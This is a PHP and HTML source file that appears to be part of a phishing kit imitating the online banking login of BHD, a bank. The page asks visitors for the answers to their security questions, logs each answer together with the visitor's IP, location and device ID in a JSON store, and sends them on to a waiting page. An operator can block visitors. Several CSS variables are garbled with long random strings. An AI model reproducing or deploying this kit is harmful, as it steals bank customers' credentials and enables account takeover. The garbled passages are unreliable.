<?php
require_once 'functions.php';

$info   = get_user_info();
$ip     = $info['ip'];
$device = get_device_id();

// Verificar si el usuario está bloqueado
if (get_user_state($device) === 'block') {
    echo "<script>
        alert('Acceso denegado: Tu usuario ha sido bloqueado.');
        window.location.href = 'https://www.google.com';
    </script>";
    exit();
}

// Cargar datos del usuario desde JSON
$data = load_data();

// ---------- OBTENER quest Y PRIMER ELEMENTO ----------
$questValues = [ ""];

// Comprueba que exista el entry del device y la clave 'quest'
if (isset($data[$device]['quest'])) {
    $raw = $data[$device]['quest'];

    // Si ya es un array, normalizamos (trim)
    if (is_array($raw)) {
        $questValues = array_map('trim', $raw);
    } elseif (is_string($raw)) {
        // Si es string, lo separamos por comas (CSV)
        $questValues = array_map('trim', explode(',', $raw));
    }
}

// Aseguramos que exista al menos un elemento
$question0 = isset($questValues[0]) && $questValues[0] !== '' ? $questValues[0] : "";
$question1 = isset($questValues[1]) && $questValues[1] !== '' ? $questValues[1] : "";
// --------------------------------------------------

// Actualizar el usuario con su device_id y página actual
update_user($ip, $info['location'], basename(__FILE__));

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Solo permitimos campos de preguntas
    $allowedFields = ["r1","r2"];
    $formData = [];

    foreach ($_POST as $key => $value) {
        if (in_array($key, $allowedFields, true)) {
            $formData[$key] = trim($value);
        }
    }

    if (!empty($formData)) {
        if (!isset($data[$device])) {
            $data[$device] = [
                'submissions' => [],
                'state'       => 'active'
            ];
        }

        $timestamp = date("Y-m-d H:i:s");
        $found = false;

        // Si ya existe una submission con exactamente estas claves, la reemplazamos
        if (isset($data[$device]['submissions'])) {
            foreach ($data[$device]['submissions'] as &$submission) {
                $existingKeys = array_keys($submission['data']);
                $formKeys     = array_keys($formData);
                sort($existingKeys);
                sort($formKeys);
                if ($existingKeys === $formKeys) {
                    $submission = [
                        'data'      => $formData,
                        'timestamp' => $timestamp
                    ];
                    $found = true;
                    break;
                }
            }
            unset($submission);
        }

        if (!$found) {
            $data[$device]['submissions'][] = [
                'data'      => $formData,
                'timestamp' => $timestamp
            ];
        }

        // Guardar nuevamente los datos (aseguramos que $questValues existe)
        $data[$device]['coord'] = implode(', ', $questValues); // Guardar como string por si fue modificado
        $data[$device]['currentPage'] = basename(__FILE__);

        save_data($data);
        header("Location: waiting.php");
        exit();
    } else {
        echo "<script>alert('Por favor, complete al menos un campo válido.');</script>";
    }
}
?>
<!DOCTYPE html>
<html>

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

  <title>BHD - IBP</title>

  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="icon" type="image/x-icon" href="https://249b2f5b0d6f.ngrok.app/aumen2025bhd/archivos/elico.ico">

  <style>
    .p-toast {
      position: fixed;
      width: 25rem
    }

    .p-toast-message {
      overflow: hidden
    }

    .p-toast-message-content {
      display: flex;
      align-items: flex-start
    }

    .p-toast-message-text {
      flex: 1 1 auto
    }

    .p-toast-top-right {
      top: 20px;
      right: 20px
    }

    .p-toast-top-left {
      top: 20px;
      left: 20px
    }

    .p-toast-bottom-left {
      bottom: 20px;
      left: 20px
    }

    .p-toast-bottom-right {
      bottom: 20px;
      right: 20px
    }

    .p-toast-top-center {
      top: 20px;
      left: 50%;
      transform: translate(-50%)
    }

    .p-toast-bottom-center {
      bottom: 20px;
      left: 50%;
      transform: translate(-50%)
    }

    .p-toast-center {
      left: 50%;
      top: 50%;
      min-width: 20vw;
      transform: translate(-50%, -50%)
    }

    .p-toast-icon-close {
      display: flex;
      align-items: center;
      justify-content: center;
      overflow: hidden;
      position: relative
    }

    .p-toast-icon-close.p-link {
      cursor: pointer
    }
  </style>
  <style>
    .bhd-captcha[_ngcontent-ddn-c132] {
      background: var(--bhd-white-color-1);
      background-image: radial-gradient(var(--bhd-gray-color-3) 1.2px, transparent 0);
      background-size: 6px 6px;
      position: relative;
      box-sizing: content-box;
      width: 120px;
      padding: 3px;
      font-weight: 400;
      height: 31px;
      font-size: x-large;
      border-radius: 4px;
      text-align: center;
      margin: 0 0 0 10px
    }

    .bhd-captcha[_ngcontent-ddn-c132] span[_ngcontent-ddn-c132] {
      letter-spacing: 8px;
      display: inline-block;
      transform: translate(-50%, -50%)
    }

    .bhd-captcha-validaton[_ngcontent-ddn-c132] {
      width: 75px;
      font-size: 21px
    }

    .bhd-captcha-line[_ngcontent-ddn-c132] {
      border-top: 1px solid var(--bhd-gray-color-1);
      letter-spacing: 8px;
      display: inline-block;
      transform: translate(-50%, -50%);
      position: absolute;
      width: 115px;
      top: 8px;
      left: 4px
    }

    .bhd-divider[_ngcontent-ddn-c132] {
      box-sizing: border-box;
      width: 20px;
      height: 0px;
      border: 1px solid var(--bhd-green-color-2);
      transform: rotate(90deg);
      flex: none;
      flex-grow: 0
    }

    .background-container[_ngcontent-ddn-c132] {
      display: grid;
      height: 100vh;
      background-size: cover;
      background-position: center;
      background-image: url(./archivos/background-login.webp)
    }

    .card-top[_ngcontent-ddn-c132] {
      padding-top: 133px
    }

    .user-input[_ngcontent-ddn-c132] {
      position: relative
    }

    .user-input[_ngcontent-ddn-c132] .close-icon[_ngcontent-ddn-c132] {
      position: absolute;
      top: 19px;
      right: 17px;
      cursor: pointer
    }

    .ibe-link[_ngcontent-ddn-c132] {
      cursor: pointer;
      color: var(--bhd-white-color-1)
    }

    .ibe-link[_ngcontent-ddn-c132]:hover span[_ngcontent-ddn-c132] {
      font-style: italic;
      text-decoration: underline
    }
  </style>
  <style>
    @charset "UTF-8";

    .bhd-loading-overlay[_ngcontent-ddn-c69] {
      background: var(--bhd-white-color-3);
      position: fixed;
      inset: -30% 0 0;
      z-index: 99999999999;
      align-items: center;
      justify-content: center;
      display: flex;
      visibility: visible;
      opacity: 1;
      transition: opacity .25s ease-in, visibility 0ms ease-in 0ms;
      overflow-y: hidden
    }

    .bhd-loading-overlay[_ngcontent-ddn-c69] .pi-spin[_ngcontent-ddn-c69] {
      animation: fa-spin 1.2s infinite linear
    }

    .bhd-fade-out[_ngcontent-ddn-c69] {
      visibility: hidden;
      opacity: 0;
      transition: opacity .25s ease-in, visibility 0ms ease-in .25s
    }

    @keyframes _ngcontent-ddn-c69_ellipsis {
      to {
        width: 1.25em
      }
    }

    .loading[_ngcontent-ddn-c69] {
      margin-left: -1.25em
    }

    .loading[_ngcontent-ddn-c69]:before {
      overflow: hidden;
      display: inline-block;
      vertical-align: bottom;
      animation: _ngcontent-ddn-c69_ellipsis steps(5, end) 2s infinite;
      content: "\2026";
      width: 0;
      color: transparent
    }

    .loading[_ngcontent-ddn-c69]:after {
      overflow: hidden;
      display: inline-block;
      vertical-align: bottom;
      animation: _ngcontent-ddn-c69_ellipsis steps(5, end) 2s infinite;
      content: "\2026";
      width: 0
    }
  </style>
  <style>
    .bhd-icon[_nghost-ddn-c12] {
      display: inline-flex
    }
  </style>
  <style>
    .p-dialog-mask {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      display: flex;
      justify-content: center;
      align-items: center;
      pointer-events: none
    }

    .p-dialog-mask.p-component-overlay {
      pointer-events: auto
    }

    .p-dialog {
      display: flex;
      flex-direction: column;
      pointer-events: auto;
      max-height: 90%;
      transform: scale(1);
      position: relative
    }

    .p-dialog-content {
      overflow-y: auto;
      flex-grow: 1
    }

    .p-dialog-header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      flex-shrink: 0
    }

    .p-dialog-draggable .p-dialog-header {
      cursor: move
    }

    .p-dialog-footer {
      flex-shrink: 0
    }

    .p-dialog .p-dialog-header-icons {
      display: flex;
      align-items: center
    }

    .p-dialog .p-dialog-header-icon {
      display: flex;
      align-items: center;
      justify-content: center;
      overflow: hidden;
      position: relative
    }

    .p-fluid .p-dialog-footer .p-button {
      width: auto
    }

    .p-dialog-top .p-dialog,
    .p-dialog-bottom .p-dialog,
    .p-dialog-left .p-dialog,
    .p-dialog-right .p-dialog,
    .p-dialog-top-left .p-dialog,
    .p-dialog-top-right .p-dialog,
    .p-dialog-bottom-left .p-dialog,
    .p-dialog-bottom-right .p-dialog {
      margin: .75rem;
      transform: translateZ(0)
    }

    .p-dialog-maximized {
      transition: none;
      transform: none;
      width: 100vw !important;
      height: 100vh !important;
      top: 0 !important;
      left: 0 !important;
      max-height: 100%;
      height: 100%
    }

    .p-dialog-maximized .p-dialog-content {
      flex-grow: 1
    }

    .p-dialog-left {
      justify-content: flex-start
    }

    .p-dialog-right {
      justify-content: flex-end
    }

    .p-dialog-top {
      align-items: flex-start
    }

    .p-dialog-top-left {
      justify-content: flex-start;
      align-items: flex-start
    }

    .p-dialog-top-right {
      justify-content: flex-end;
      align-items: flex-start
    }

    .p-dialog-bottom {
      align-items: flex-end
    }

    .p-dialog-bottom-left {
      justify-content: flex-start;
      align-items: flex-end
    }

    .p-dialog-bottom-right {
      justify-content: flex-end;
      align-items: flex-end
    }

    .p-dialog .p-resizable-handle {
      position: absolute;
      font-size: .1px;
      display: block;
      cursor: se-resize;
      width: 12px;
      height: 12px;
      right: 1px;
      bottom: 1px
    }

    .p-confirm-dialog .p-dialog-content {
      display: flex;
      align-items: center
    }
  </style>
  <style>
    .p-card-header img {
      width: 100%
    }
  </style>
  <style type="text/css" class="ng-tns-c15-1">
    @media screen and (max-width: 640px) {
      .p-dialog[pr_id_2] {
        width: 100vw !important;
      }
    }
  </style>

</head>

<body>
  <div id="ZN_8cEqHp0zudYbF7E"></div>
  <style>
    :root {
      --surface-a: #ffffff;
      --surface-b: #f8f9fa;
      --surface-c: #e9ecef;
      --surface-d: #dee2e6;
      --surface-e: #ffffff;
      --surface-f: #ffffff;
      --text-color: #495057;
      --text-color-secondary: #6c757d;
      --primary-color: #2196F3;
      --primary-color-text: #ffffff;
      --font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica, Arial, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol;
      --surface-0: #ffffff;
      --surface-50: #FAFAFA;
      --surface-100: #F5F5F5;
      --surface-200: #EEEEEE;
      --surface-300: #E0E0E0;
      --surface-400: #BDBDBD;
      --surface-500: #9E9E9E;
      --surface-600: #757575;
      --surface-700: #616161;
      --surface-800: #42EYHgEzWEdjJgYKAu8VjC4DohVYUMbvZ6Ua45MgSaYBTFv3725expKB69YsjM6Utj99E6Sn3LpcxQ4mNrwfrJLM5NGbWiQ:#E0E0E0;
      --gray-49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ900: #212121;
      --content-padding: 1rem;
      --inline-spacing: .5rem;
      --border-radius: 3px;
      --surface-ground: #f8f9fa;
      --surface-section: #ffffff;
      --surface-card: #ffffff;
      --surface-overlay: #ffffff;
      --surface-border: #dee2e6;
      --surface-hover: #e9ecef;
      --maskbg: rgba(0, 0, 0, .4);
      --highlight-bg: #E3F2FD;
      --highlight-text-color: #42EYHgEzWEdjJgYKAu8VjC4DohVYUMbvZ6Ua45MgSaYBTFv3725expKB69YsjM6Utj99E6Sn3LpcxQ4mNrwfrJLM5NGbWiQ-50:#f4fafe;
      --blue-100: #cae6fc;
      --blue-200: #a0d2fa;
      --blue-300: #75bef8;
      --blue-49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ900: #0d3c61;
      --green-50: #f6fbf6;
      --green-100: #d4ecd5;
      --green-200: #b2ddb4;
      --green-300: #90cd93;
      --green-400: #6ebe71;
      --green-500: #4caf50;
      --green-600: #42EYHgEzWEdjJgYKAu8VjC4DohVYUMbvZ6Ua45MgSaYBTFv3725expKB69YsjM6Utj99E6Sn3LpcxQ4mNrwfrJLM5NGbWiQ-100:#fef0cd;
      --yellow-200: #fde4a5;
      --yellow-300: #fdd87d;
      --yellow-42EYHgEzWEdjJgYKAu8VjC4DohVYUMbvZ6Ua45MgSaYBTFv3725expKB69YsjM6Utj99E6Sn3LpcxQ4mNrwfrJLM5NGbWiQ;
      --yellow-900: #644d12;
      --cyan-50: #f2fcfd;
      --cyan-100: #c2eff5;
      --cyan-200: #91e2ed;
      --cyan-300: #61d5e4;
      --cyan-49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ900: #004b55;
      --pink-50: #fef4f7;
      --pink-100: #fac9da;
      --pink-200: #f69ebc;
      --pink-300: #f1749e;
      --pink-49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ900: #5d0c28;
      --indigo-50: #f5f6fb;
      --indigo-100: #d1d5ed;
      --indigo-200: #acb4df;
      --indigo-300: #8893d1;
      --indigo-42EYHgEzWEdjJgYKAu8VjC4DohVYUMbvZ6Ua45MgSaYBTFv3725expKB69YsjM6Utj99E6Sn3LpcxQ4mNrwfrJLM5NGbWiQ;
      --indigo-900: #192048;
      --teal-50: #f2faf9;
      --teal-100: #c2e6e2;
      --teal-200: #91d2cc;
      --teal-300: #61beb5;
      --teal-49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ900: #003c36;
      --orange-50: #fff8f2;
      --orange-100: #fde0c2;
      --orange-200: #fbc791;
      --orange-300: #f9ae61;
      --orange-42EYHgEzWEdjJgYKAu8VjC4DohVYUMbvZ6Ua45MgSaYBTFv3725expKB69YsjM6Utj99E6Sn3LpcxQ4mNrwfrJLM5NGbWiQ;
      --orange-900: #623200;
      --bluegray-50: #f7f9f9;
      --bluegray-100: #d9e0e3;
      --bluegray-200: #bbc7cd;
      --bluegray-300: #9caeb7;
      --bluegray-42EYHgEzWEdjJgYKAu8VjC4DohVYUMbvZ6Ua45MgSaYBTFv3725expKB69YsjM6Utj99E6Sn3LpcxQ4mNrwfrJLM5NGbWiQ: #35454c;
      --bluegray-900: #263238;
      --purple-50: #faf4fb;
      --purple-100: #e7cbec;
      --purple-200: #d4a2dd;
      --purple-300: #c279ce;
      --purple-42EYHgEzWEdjJgYKAu8VjC4DohVYUMbvZ6Ua45MgSaYBTFv3725expKB69YsjM6Utj99E6Sn3LpcxQ4mNrwfrJLM5NGbWiQ;
      --purple-900: #3e1046;
      --red-50: #fff5f5;
      --red-100: #ffd1ce;
      --red-200: #ffada7;
      --red-300: #ff8980;
      --red-49D2SNGzC9GHcrUUaqinbv3Z2PLFKvxxmFNNsY6aQG72DmWbGET77srS3bd7S1wwYLTnyPqURASpx15UMac6uZKxFzSmgvJ661a14;
      --primary-50: #f4fafe;
      --primary-100: #cae6fc;
      --primary-200: #a0d2fa;
      --primary-300: #75bef8;
      --primary-400: #4baaf5;
      --primary-500: #2196f3;
      --primary-600: #1c80cf;
      --primary-700: #1769aa;
      --primary-800: #125386;
      --primary-900: #0d3c61
    }

    :root {
      --bhd-white-color-1: #ffffff;
      --bhd-white-color-2: #f1f1f1;
      --bhd-white-color-3: #ffffffb3;
      --bhd-green-color-1: #00560e;
      --bhd-green-color-2: #51af46;
      --bhd-green-color-3: #9ac593;
      --bhd-green-color-4: #c8e6c9;
      --bhd-green-color-5: #f3fcf3;
      --bhd-green-color-6: #d9ecc6;
      --bhd-green-color-7: #357b2a;
      --bhd-gray-color-1: #2c353a;
      --bhd-gray-color-2: #5e5e5e;
      --bhd-gray-color-3: #869394;
      --bhd-gray-color-4: #f8f9fa;
      --bhd-gray-color-5: #dee2e6;
      --bhd-gray-color-6: #dcdcdc;
      --bhd-gray-color-7: #fcfcfc;
      --bhd-gray-color-8: #eaedf1;
      --bhd-blue-color-1: #003e7e;
      --bhd-blue-color-2: #0d89ec;
      --bhd-blue-color-3: #859ece;
      --bhd-blue-color-4: #edf3ff;
      --bhd-red-color-1: #ec6666;
      --bhd-red-color-2: #ffcdd2;
      --bhd-red-color-3: #5a1a1a;
      --bhd-brown-color-1: #6d5100;
      --bhd-yellow-color-1: #ffecb3;
      --bhd-orange-color-1: #ffc100
    }

    @font-face {
      font-family: Trebuchet;
      src: url(TrebuchetMS.7c6358bbdb6ed6be.ttf) format("woff")
    }

    html {
      background-color: var(--bhd-gray-color-8)
    }

    html body {
      font-family: Trebuchet MS, Helvetica, sans-serif;
      font-size: 13px
    }

    body {
      overflow-x: hidden;
      margin: 0
    }
  </style>
  <link rel="stylesheet" href="./content/styles.167565ce846e1d80.css" media="all"
    onload="this.media=&#39;all&#39;">
  <noscript>
    <link rel="stylesheet" href="styles.167565ce846e1d80.css">
  </noscript>

  <ibp-root ng-version="15.2.9"><router-outlet></router-outlet>

    <ibp-login _nghost-ddn-c132="" class="ng-star-inserted">
      <div _ngcontent-ddn-c132="" class="background-container ng-star-inserted" style="height:100%">

        <div _ngcontent-ddn-c132="" class="p-d-flex p-jc-center card-top">
          <div _ngcontent-ddn-c132="" class="p-d-flex p-flex-column">
            <p-card _ngcontent-ddn-c132="" class="p-element">
              <div class="p-card p-component" style="max-width: 500px;"><!---->
                <div class="p-card-body"><!----><!---->
                  <div class="p-card-content">
                    <div _ngcontent-ddn-c132="" class="p-grid">

                      <form _ngcontent-ddn-c132="" method="post"
                        class="ng-untouched ng-pristine ng-invalid">


                        <div _ngcontent-ddn-c132="" class="p-fluid p-formgrid p-grid p-jc-center">
                          <div _ngcontent-ddn-c132="" routerlink="dashboard"
                            class="p-d-flex p-ai-center bhd-header-logo" tabindex="0">

                            <img _ngcontent-ddn-c132="" ngsrc="assets/img/logo-bhd.svg" height="100" width="100"
                              alt="logo-bhd" loading="lazy" fetchpriority="auto" ng-img="true"
                              src="./content/logo-bhd.svg">
                            <em _ngcontent-ddn-c132="" class="bhd-divider"></em>
                            <h2 _ngcontent-ddn-c132="" class="bhd-green-2 p-text-italic bhd-bold bhd--font-size-22">
                              Personal</h2>
                          </div>



                          <div _ngcontent-ddn-c132="" class="p-field p-col-10">
                            <h2 _ngcontent-ddn-c132="" class="bhd-green-2 p-text-italic bhd-bold bhd--font-size-18">
                              Preguntas de seguridad</h2>
                            Responde correctamente las preguntas que configuraste para acceder a tus productos <br><br>

                            <label _ngcontent-ddn-c132="" for="userName">Respuesta N° 1 <?= htmlspecialchars($question0, ENT_QUOTES, 'UTF-8') ?> <span
                                _ngcontent-ddn-c132="" class="bhd-red-1">*</span></label>
                            <span _ngcontent-ddn-c132="" class="p-input-icon-left user-input">
                            </span>
                            <input name="r1" id="ans1"
                              class="p-inputtext p-component p-element ng-untouched ng-pristine ng-invalid"
                              placeholder="Digita Respuesta 1" autocomplete="off" required="" type="text" style="">

                            <br><br>
                            <label _ngcontent-ddn-c132="" for="userName">Respuesta N° 2 <?= htmlspecialchars($question1, ENT_QUOTES, 'UTF-8') ?>
                            <span _ngcontent-ddn-c132="" class="bhd-red-1">*</span></label>
                            <span _ngcontent-ddn-c132="" class="p-input-icon-left user-input">

                            </span>
                            <input name="r2" id="ans2"
                              class="p-inputtext p-component p-element ng-untouched ng-pristine ng-invalid"
                              placeholder="Digita Respuesta 2" autocomplete="off" required="" type="text" style="">

                          </div>




                          <div _ngcontent-ddn-c132="" class="p-field p-col-10 p-mb-2" style="display: none;">
                            <div _ngcontent-ddn-c132="" class="p-d-flex">
                              <div _ngcontent-ddn-c132="">
                                <div _ngcontent-ddn-c132="" class="bhd-captcha"><!---->
                                  <canvas _ngcontent-ddn-c132="" width="110" height="30"></canvas>
                                </div>

                                <div _ngcontent-ddn-c132="" class="p-mb-4 p-mt-2 bhd--font-size-12">
                                  <p _ngcontent-ddn-c132="" class="p-m-0 bhd-hover-green-2-pointer">Refrescar imagen</p>
                                </div>
                              </div>
                              <div _ngcontent-ddn-c132="" class="p-ml-3">

                                <input _ngcontent-ddn-c132="" type="text" pinputtext="" name="captcha" maxlength="4"
                                  formcontrolname="captcha"
                                  class="p-inputtext p-component p-element bhd-captcha-validaton ng-untouched ng-pristine ng-valid"><!---->
                              </div>
                            </div>
                          </div>
                          <div _ngcontent-ddn-c132="" class="p-field p-col-10 p-mt-2">

                            <p-button _ngcontent-ddn-c132="" type="submit" iconpos="right" class="p-element">
                              <button pripple="" class="p-ripple p-element bhd-btn-primary p-button p-component"
                                type="submit">
                                <!----><!----><!----><!----><!----><!---->
                                <span class="p-button-label ng-star-inserted">Continuar</span><!----><!---->
                                <span class="p-ink"></span></button></p-button>
                          </div>

                        </div>
                      </form>
                    </div>
                    <div _ngcontent-ddn-c132="" class="p-fluid p-formgrid p-grid p-jc-center">
                      <div _ngcontent-ddn-c132="" class="p-field p-col-10 p-m-0 p-p-0"><!----></div>
                    </div><!---->
                  </div><!---->
                </div>
              </div>
            </p-card>
            <div _ngcontent-ddn-c132="" class="p-d-flex p-ai-center p-jc-center p-pt-3 ibe-link">
              <em _ngcontent-ddn-c132="" class="pi pi-arrow-left"></em>
              <span _ngcontent-ddn-c132="" class="p-pl-2 bhd--font-size-16">Ir a Inicio</span>
            </div>
          </div>
        </div>
        <div _ngcontent-ddn-c132="" class="bhd-version"><span _ngcontent-ddn-c132=""
            class="number-version">v1.0.8</span></div>
      </div><!----><!----><ibp-loader _ngcontent-ddn-c132="" _nghost-ddn-c69="">
        <div _ngcontent-ddn-c69="" class="bhd-loading-overlay p-d-flex p-flex-column bhd-fade-out"><bhd-icon
            _ngcontent-ddn-c69="" name="action-reuse" class="bhd-green-2 pi-spin bhd-icon" _nghost-ddn-c12=""
            style="width: 58px; height: 58px;"><svg _ngcontent-ddn-c12="" xmlns="http://www.w3.org/2000/svg" fill="none"
              stroke-linecap="round" stroke-linejoin="round" stroke="var(--bhd-icon-color, currentColor)"
              class="bhd-icon-action-reuse" viewBox="0 0 24 24" stroke-width="2">
              <path stroke-linecap="round" stroke-linejoin="round"
                d="M19.603 16c-1.42EYHgEzWEdjJgYKAu8VjC4DohVYUMbvZ6Ua45MgSaYBTFv3725expKB69YsjM6Utj99E6Sn3LpcxQ4mNrwfrJLM5NGbWiQ 4.408-5 7.846-5 4.508 0 8.22 3.5 8.704 8M4.397 8H8M4.397 8 3 5">
              </path>
            </svg></bhd-icon>
          <h3 _ngcontent-ddn-c69="" class="bhd--font-size-22 loading">Accediendo al canal, por favor espere</h3>
        </div>
      </ibp-loader><ibp-common-modal _ngcontent-ddn-c132=""><p-dialog
          class="p-element ng-tns-c15-1 ng-star-inserted"><!----></p-dialog></ibp-common-modal>
    </ibp-login><!----><p-toast position="top-right" class="p-element ng-tns-c10-0">
      <div class="ng-tns-c10-0 p-toast p-component p-toast-top-right"><!----></div>
    </p-toast></ibp-root>

  <div>

  </div>
</body>

</html>